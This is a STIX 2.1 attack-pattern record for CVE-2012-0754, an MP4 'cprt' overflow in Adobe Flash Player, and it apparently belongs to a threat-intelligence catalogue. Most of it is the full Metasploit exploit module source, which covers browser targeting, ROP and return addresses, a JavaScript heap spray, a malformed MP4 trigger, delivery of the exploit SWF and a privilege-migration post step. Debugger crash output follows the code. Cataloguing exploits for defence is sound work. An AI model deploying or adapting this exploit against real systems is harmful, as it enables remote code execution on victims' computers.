{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dfdacc0e-8a41-44c4-9b18-1150d4e98472",
    "created": "2024-08-14T16:43:12.102025Z",
    "modified": "2024-08-14T16:43:12.102029Z",
    "name": "\"Adobe Flash Player MP4 cprt Overflow\"",
    "description": " This module exploits a vulnerability found in Adobe Flash Player.  By supplying a corrupt .mp4 file loaded by Flash, it is possible to gain arbitrary remote code execution under the context of the user.  This vulnerability has been exploited in the wild as part of the \"Iran's Oil and Nuclear Situation.doc\" e-mail attack. According to the advisory, 10.3.183.15 and 11.x before 11.1.102.62 are affected.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_mp4_cprt.rb",
            "external_id": "adobe_flash_mp4_cprt.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0754"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com/2012/03/mar-2-cve-2012-0754-irans-oil-and.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb12-03.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :os_name    => OperatingSystems::Match::WINDOWS,\n    :method     => \"GetVariable\",\n    :classid    => \"ShockwaveFlash.ShockwaveFlash\",\n    :rank       => NormalRanking, # reliable memory corruption\n    :javascript => true\n  })\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player MP4 'cprt' Overflow\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Adobe Flash\n        Player.  By supplying a corrupt .mp4 file loaded by Flash, it\n        is possible to gain arbitrary remote code execution under the\n        context of the user.\n\n        This vulnerability has been exploited in the wild as part of\n        the \"Iran's Oil and Nuclear Situation.doc\" e-mail attack.\n        According to the advisory, 10.3.183.15 and 11.x before\n        11.1.102.62 are affected.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexander Gavrun', # Vulnerability discovery\n          'sinn3r',           # Metasploit module\n          'juan vazquez'      # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0754' ],\n          [ 'OSVDB', '79300'],\n          [ 'BID', '52034' ],\n          [ 'URL', 'http://contagiodump.blogspot.com/2012/03/mar-2-cve-2012-0754-irans-oil-and.html' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb12-03.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Flash Player 11.1.102.55\n          # Flash Player 10.3.183.10\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Rop'    => nil,\n              'Offset' => '0x800 - code.length',\n              'Ret'    => 0x0c0c0c0c\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3',\n            {\n              'Rop'    => nil,\n              'Offset' => '0x800 - code.length',\n              'Ret'    => 0x0c0c0c0c\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3 with msvcrt ROP',\n            {\n              'Rop'    => :msvcrt,\n              'Offset' => '0x5f4',\n              'Ret'    => 0x77c15ed5,\n              'ppr'    => 0x77C1CAFB\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3 with JRE ROP',\n            {\n              'Rop'    => :jre,\n              'Offset' => '0x5f4',\n              'Ret'    => 0x77c15ed5,\n              'ppr'    => 0x77C1CAFB\n            }\n          ],\n          [\n            'IE 7 on Windows Vista',\n            {\n              'Rop'    => nil,\n              'Offset' => '0x5f4',\n              'Ret'    => 0x0c0c0c0c\n            }\n          ],\n          [\n            'IE 8 on Windows 7 SP1',\n            {\n              'Rop'    => :jre,\n              'Offset' => '0x5f4',\n              'Ret'    => 0x7c348b05,\n              'ppr'    => 0x7c34272e\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-02-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def get_payload(t, cli)\n\n    if t['Rop'].nil?\n      code = \"\"\n    else\n      #Fix the stack to avoid anything busted\n      code = \"\\x81\\xC4\\x54\\xF2\\xFF\\xFF\"\n    end\n    code << payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    rop_name = (t['Rop'] and t['Rop'] == :msvcrt) ? 'msvcrt' : 'java'\n    rop_target = (rop_name == 'msvcrt') ? 'xp' : ''\n\n    pivot  = [t['ppr']].pack('V*')  #POP/POP/RET\n    pivot << [junk].pack('V*')\n    pivot << [t.ret].pack('V*')\n\n    code = generate_rop_payload(rop_name, code, {'target'=>rop_target})\n    return code\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[5]  #IE 7 on Windows Vista\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[6]  #IE 8 on Windows Vista SP1 with JRE\n    else\n      return nil\n    end\n  end\n\n  def primer\n    # \"/test.mp4\" is currently hard-coded in the swf file, so we need to add to resource\n    hardcoded_uripath(\"/test.mp4\")\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Client requesting: #{request.uri}\")\n\n    # The SWF requests our MP4 trigger\n    if request.uri =~ /\\.mp4$/\n      print_status(\"Sending MP4...\")\n      mp4 = create_mp4(my_target)\n      send_response(cli, mp4, {'Content-Type'=>'video/mp4'})\n      return\n    end\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending Exploit SWF\")\n      send_response(cli, @swf, { 'Content-Type' => 'application/x-shockwave-flash' })\n      return\n    end\n\n    p = get_payload(my_target, cli)\n\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js_pivot = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    heap_obj.debug(true);\n    for (var i=1; i < 0x1C2; i++) {\n      heap_obj.alloc(block);\n    }\n    heap_obj.debug(true);\n    JS\n\n    js_pivot = heaplib(js_pivot, {:noobfu => true})\n\n    swf_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n    swf_uri << \"/#{rand_text_alpha(rand(6)+3)}.swf\"\n\n    html = %Q|\n<html>\n<head>\n<script>\n#{js_pivot}\n</script>\n</head>\n<body>\n<center>\n<object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"\nid=\"test\" width=\"1\" height=\"1\"\ncodebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\n<param name=\"movie\" value=\"#{swf_uri}\" />\n<embed src=\"#{swf_uri}\" quality=\"high\"\nwidth=\"1\" height=\"1\" name=\"test\" align=\"middle\"\nallowNetworking=\"all\"\ntype=\"application/x-shockwave-flash\"\npluginspage=\"http://www.macromedia.com/go/getflashplayer\">\n</embed>\n\n</object>\n</center>\n\n</body>\n</html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2012-0754.swf\" )\n    fd = ::File.open( path, \"rb\" )\n    swf = fd.read(fd.stat.size)\n    fd.close\n\n    return swf\n  end\n\n  def create_mp4(target)\n    mp4 = \"\"\n    mp4 << \"\\x00\\x00\\x00\\x18\"\n    mp4 << \"ftypmp42\"\n    mp4 << \"\\x00\\x00\\x00\\x00\"\n    mp4 << \"mp42isom\"\n    mp4 << \"\\x00\\x00\\x00\\x0D\"\n    mp4 << \"cprt\"\n    mp4 << \"\\x00\\xFF\\xFF\\xFF\"\n    mp4 << \"\\x00\\x00\\x00\\x00\"\n    mp4 << \"\\x0c\\x0c\\x0c\\x0c\" * 2586\n\n    return mp4\n  end\nend\n\n=begin\nC:\\WINDOWS\\system32\\Macromed\\Flash\\Flash11e.ocx\n\n(4b4.1d0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0c0c0c0c ebx=00000000 ecx=0308b1a0 edx=00000004 esi=0308b1a0 edi=00000001\neip=027a2626 esp=0377fec0 ebp=0377ff0c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\Macromed\\Flash\\Flash11e.ocx -\nFlash11e+0x52626:\n027a2626 ff5008          call    dword ptr [eax+8]    ds:0023:0c0c0c14=????????\n\nC:\\WINDOWS\\system32\\Macromed\\Flash\\Flash10x.ocx\n\n(510.9b4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0c0c0c0c ebx=03e46810 ecx=0396b160 edx=00000004 esi=03e46cd4 edi=00000000\neip=10048b65 esp=0428fd10 ebp=0428feb4 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\Macromed\\Flash\\Flash10x.ocx -\nFlash10x+0x48b65:\n10048b65 ff5008          call    dword ptr [eax+8]    ds:0023:0c0c0c14=????????\n=end\n",
    "x_mitre_disclosure_date": "2012-02-15",
    "x_mitre_platforms": [
        "win'"
    ]
}